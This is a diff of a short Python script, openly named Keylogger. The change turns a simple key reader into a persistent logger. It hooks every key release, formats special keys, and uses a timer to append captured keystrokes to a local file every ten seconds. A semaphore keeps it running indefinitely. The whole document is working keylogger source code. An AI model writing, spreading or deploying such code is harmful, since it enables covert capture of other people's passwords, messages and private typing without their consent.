@@ -1,25 +1,54 @@
 import keyboard
 import sys
+from threading import Semaphore, Timer
 
+INTERVAL = 10
 
 class Keylogger:
-    def __init__(self, fileName):
+    def __init__(self, fileName, interval):
         self.key = ""
         self.fileName = fileName
+        self.interval = interval
+        self.semaphore = Semaphore(0)
 
-    def run(self):
-        while keyboard.read_key() != 'esc':
-            self.key += keyboard.read_key() + "\n"
-        
-        self.__writeFile(self.key)
-        sys.exit(0)
 
-    def __writeFile(self, keys):
+    def callback(self, event):
+        name = event.name
+
+        if len(name) > 1:
+            if name == 'space':
+                name = " "
+            elif name == 'enter':
+                name = "enter\n"
+            elif name == 'decimal':
+                name = "."
+            else:
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        self.key += name
+
+            
+
+    def __writeFile(self, buffer):
         fp = open(self.fileName, 'a')
-        fp.write(keys)
+        fp.write(buffer)
         fp.close()
 
+    def report(self):
+        if self.key:
+            self.__writeFile(self.key)
+        self.key = ""
+        Timer(interval=self.interval, function=self.report).start()
+    
+    def run(self):
+        keyboard.on_release(callback=self.callback)
+        self.report()
+        self.semaphore.acquire()
 
-keyLogger = Keylogger("testKeyboard.txt")
-keyLogger.run()
+if __name__ == "__main__":
+    keyLogger = Keylogger("testKeyboard.txt", INTERVAL)
+    keyLogger.run()
+
+
+
 
